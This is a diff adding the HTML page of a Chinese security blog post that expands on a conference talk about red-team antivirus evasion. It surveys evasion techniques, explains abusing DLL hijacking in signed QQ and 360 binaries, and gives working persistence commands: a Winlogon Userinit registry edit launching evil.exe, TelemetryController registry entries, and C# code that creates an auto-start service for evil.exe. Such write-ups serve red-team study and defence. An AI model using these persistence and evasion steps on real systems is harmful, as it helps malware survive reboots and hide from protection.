@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="免杀,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="scareing的学习笔记" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="关于”杀软对抗”的议题拓展 本文章作为CIS网络安全创新大会议题 Redteaming：主流杀软对抗之路 的扩展与延伸，从为什么出发，到杀软规则的测试与讨论.  CIS议题重点 shellcode加密   针对杀软于shellcode的静态二进制特征查杀，用加密解决shellcode的静态特征。   IAT导入地址表   针对杀软对PE文件的IAT导入表的敏感函数检测，使用动态调用的技巧，完成隐藏">
+<meta name="keywords" content="免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于CIS&quot;杀软对抗&quot;的议题拓展">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/index.html">
+<meta property="og:site_name" content="scareing的学习笔记">
+<meta property="og:description" content="关于”杀软对抗”的议题拓展 本文章作为CIS网络安全创新大会议题 Redteaming：主流杀软对抗之路 的扩展与延伸，从为什么出发，到杀软规则的测试与讨论.  CIS议题重点 shellcode加密   针对杀软于shellcode的静态二进制特征查杀，用加密解决shellcode的静态特征。   IAT导入地址表   针对杀软对PE文件的IAT导入表的敏感函数检测，使用动态调用的技巧，完成隐藏">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/4.png">
+<meta property="og:updated_time" content="2021-01-11T09:48:23.581Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于CIS&quot;杀软对抗&quot;的议题拓展">
+<meta name="twitter:description" content="关于”杀软对抗”的议题拓展 本文章作为CIS网络安全创新大会议题 Redteaming：主流杀软对抗之路 的扩展与延伸，从为什么出发，到杀软规则的测试与讨论.  CIS议题重点 shellcode加密   针对杀软于shellcode的静态二进制特征查杀，用加密解决shellcode的静态特征。   IAT导入地址表   针对杀软对PE文件的IAT导入表的敏感函数检测，使用动态调用的技巧，完成隐藏">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/">
+
+
+
+
+
+  <title>关于CIS"杀软对抗"的议题拓展 | scareing的学习笔记</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">scareing的学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">道可道，非常道, 名可名，非常名!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">关于CIS"杀软对抗"的议题拓展</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-04T00:00:01+08:00">
+                2021-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/C/" itemprop="url" rel="index">
+                    <span itemprop="name">C</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="关于”杀软对抗”的议题拓展"><a href="#关于”杀软对抗”的议题拓展" class="headerlink" title="关于”杀软对抗”的议题拓展"></a>关于”杀软对抗”的议题拓展</h1><blockquote>
+<p>本文章作为CIS网络安全创新大会议题 <strong>Redteaming：主流杀软对抗之路</strong> 的扩展与延伸，从<strong>为什么</strong>出发，到杀软规则的测试与讨论.</p>
+</blockquote>
+<h2 id="CIS议题重点"><a href="#CIS议题重点" class="headerlink" title="CIS议题重点"></a>CIS议题重点</h2><ul>
+<li>shellcode加密</li>
+</ul>
+<blockquote>
+<p>针对杀软于shellcode的静态二进制特征查杀，用加密解决shellcode的静态特征。</p>
+</blockquote>
+<ul>
+<li>IAT导入地址表</li>
+</ul>
+<blockquote>
+<p>针对杀软对PE文件的IAT导入表的敏感函数检测，使用动态调用的技巧，完成隐藏导入函数的效果。</p>
+</blockquote>
+<ul>
+<li>混淆编译</li>
+</ul>
+<blockquote>
+<p>针对杀软对特征字符串和函数执行流程的检测，使用编译时混淆字符串和函数调用混淆的办法，隐藏特征字符串，和使用有限状态机的函数执行。</p>
+</blockquote>
+<ul>
+<li>API执行链</li>
+</ul>
+<blockquote>
+<p>针对基于启发式扫描的API执行链检测，使用巨大的内存分配与填充，干扰API执行链，具有行为免杀的效果。</p>
+</blockquote>
+<ul>
+<li>强延时</li>
+</ul>
+<blockquote>
+<p>针对杀软和沙箱的时间加速，使用模拟计算来实现一个强延时，具有无视时间加速和一定的反沙箱效果。</p>
+</blockquote>
+<ul>
+<li>系统调用</li>
+</ul>
+<blockquote>
+<p>针对杀软及EDR的用户态HOOK，使用本地加载并映射ntdll.dll技巧来实现动态系统调用，解决系统调用的兼容性问题，完成对挂钩函数的脱钩。</p>
+</blockquote>
+<h2 id="为什么讲这几点？"><a href="#为什么讲这几点？" class="headerlink" title="为什么讲这几点？"></a>为什么讲这几点？</h2><blockquote>
+<p>在我看来，bypass杀软和bypass waf是一样的，需要见招拆招，各种技巧思路都应具有针对性，比如我在CIS中的讲的各点，其实只是一些常规操作，但是它都针对了杀软检测规则的一部分，从而具有目的性的完成想要的效果：bypass。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/1.png" alt="avatar"></p>
+<h2 id="了解杀软检测规则"><a href="#了解杀软检测规则" class="headerlink" title="了解杀软检测规则"></a>了解杀软检测规则</h2><blockquote>
+<p>举个例子（利用规则）</p>
+<ul>
+<li><p>360安全卫士对于自启动的拦截十分严格，但是问题在于，自启动是正常的系统行为，为什么QQ加自启动不会被拦截？</p>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/3.png" alt="avatar"></p>
+<ul>
+<li><p>答案大家应该也知道，因为QQ带有高信誉的签名。（那么我们能不能利用这一点呢？）</p>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/2.png" alt="avatar"></p>
+</li>
+<li><p>答案当然是可以的，我们如果能找到一个QQ的DLL劫持，QQ会加载被劫持的恶意DLL，然后恶意的DLL将会为我们添加自启动，于是就利用带有腾讯签名的进程（QQ.exe）,为我们添加自启动.</p>
+</li>
+<li><p>在今年更新360 13前，这个玩法都是有效的，那么为什么现在失效了。</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/5.png" alt="avatar"></p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>这里使用的是360浏览器的一个dll劫持，带有360的签名，但是在最新版360的检测下，由于加载的DLL无签名，又因为这个DLL产生了高危的行为（添加自启动），于是此DLL被定义为恶意文件。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/4.png" alt="avatar"></p>
+<blockquote>
+<p>通过利用规则，我在这里利用了360对签名进程的高信誉证书的信任，完成了启动项的添加。</p>
+</blockquote>
+<p><strong>再举个例子（绕过规则）</strong></p>
+<ul>
+<li>使用360所不知道，不在拦截名单中的自启动，也能达成添加自启动的目的。</li>
+</ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg add <span class="string">"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"</span> <span class="string">/v</span> Userinit <span class="string">/d</span> <span class="string">"Userinit.exe, evil.exe"</span> <span class="string">/f</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>这个自启动注册表，于去年年底公开，然后存活了一个月。</p>
+</blockquote>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg add "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\A</span>ppCompatFlags<span class="symbol">\T</span>elemetryController<span class="symbol">\t</span>est" /v Command /d c:<span class="symbol">\\</span>windows<span class="symbol">\\</span>system32<span class="symbol">\\</span>notepad.exe</span><br><span class="line">&gt; reg add "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\A</span>ppCompatFlags<span class="symbol">\T</span>elemetryController<span class="symbol">\t</span>est" /v Nightly  /t REG_DWORD /d 1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>遥测，这是个Windows的自启动计划任务，于今年上半年爆出，一个月后失效</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> using System;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Collections.Generic;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Linq;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Text;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Management.Automation;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Collections.ObjectModel;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> public class Program</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> &#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	public static void Main()</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		PowerShell ps1 = PowerShell.Create();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps1.AddScript(<span class="string">"new-service –Name OrderService –DisplayName OrderService –BinaryPathName c:/evil.exe  –StartupType Automatic;Start-Service OrderService"</span>);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps1.Invoke();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		PowerShell ps2 = PowerShell.Create();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps2.AddCommand(<span class="string">"Get-Process"</span>);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		Collection&lt;PSObject&gt; PSOutput = ps2.Invoke();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		foreach (PSObject outputItem <span class="keyword">in</span> PSOutput)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			<span class="keyword">if</span> (outputItem != null)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 				Console.WriteLine(outputItem);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> &#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>这个是我自己发现的，在去年讨论使用.net实现powershell被禁用的环境下执行powershell的技巧时，我就尝试过用这种技巧去添加自启动，于今年年初失效。</p>
+</blockquote>
+</blockquote>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote>
+<p>由我的观察可得出</p>
+<p>360安全卫士的拦截规则其实非常死板，完全基于签名与黑名单，添加黑名单中的启动项时，需要检查进程签名，启动项所对应的启动程序也需要检查签名，现在被加载的dll也要检查签名。</p>
+<p>进程可信 +  启动项对应对象可信 + dll可信（如果是dll的启动项添加行为） =  添加通过。</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>利用规则</p>
+<ul>
+<li><p>即利用对高信誉签名的信任，可以完成任意启动项的添加。</p>
+<blockquote>
+<p>优点：灵活，可以直接完成绝大部分行为的bypass</p>
+<p>缺点：难找，难利用。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>绕过规则</p>
+<ul>
+<li><p>绕过规则中的黑名单添加项or添加方式。</p>
+<blockquote>
+<p>优点：比较容易寻找并利用，通过研究注册表功能及一些隐藏项，即可找到黑名单外的启动项。</p>
+<p>缺点：启动方式单一，技巧容易被捕获。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>很不幸，今天讲的技巧都已经无效，但是我希望的是，读者能从这些bypass案例中，寻找到bypass的思路，</p>
+<p>我前端时间发过一个视频，可以任意添加注册表和服务，就是通过系统机制完成的对微软签名的滥用，即使360更新到了13，同样也一样能bypass，</p>
+<p><a href="https://www.bilibili.com/video/BV14t4y1i7aX/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV14t4y1i7aX/</a></p>
+</blockquote>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+    <div>
+          
+            
+          
+    </div>
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    scareing
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/" title="关于CIS" 杀软对抗"的议题拓展">https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/免杀/" rel="tag"># 免杀</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/01/hw工具/" rel="next" title="HW工具">
+                <i class="fa fa-chevron-left"></i> HW工具
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Bloglogo.jpg" alt="scareing">
+            
+              <p class="site-author-name" itemprop="name">scareing</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jickhab@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于”杀软对抗”的议题拓展"><span class="nav-number">1.</span> <span class="nav-text">关于”杀软对抗”的议题拓展</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CIS议题重点"><span class="nav-number">1.1.</span> <span class="nav-text">CIS议题重点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么讲这几点？"><span class="nav-number">1.2.</span> <span class="nav-text">为什么讲这几点？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#了解杀软检测规则"><span class="nav-number">1.3.</span> <span class="nav-text">了解杀软检测规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结论"><span class="nav-number">1.4.</span> <span class="nav-text">结论</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">scareing</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+       <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+       <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+       <script type="text/javascript" src="/js/src/fireworks.js"></script>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
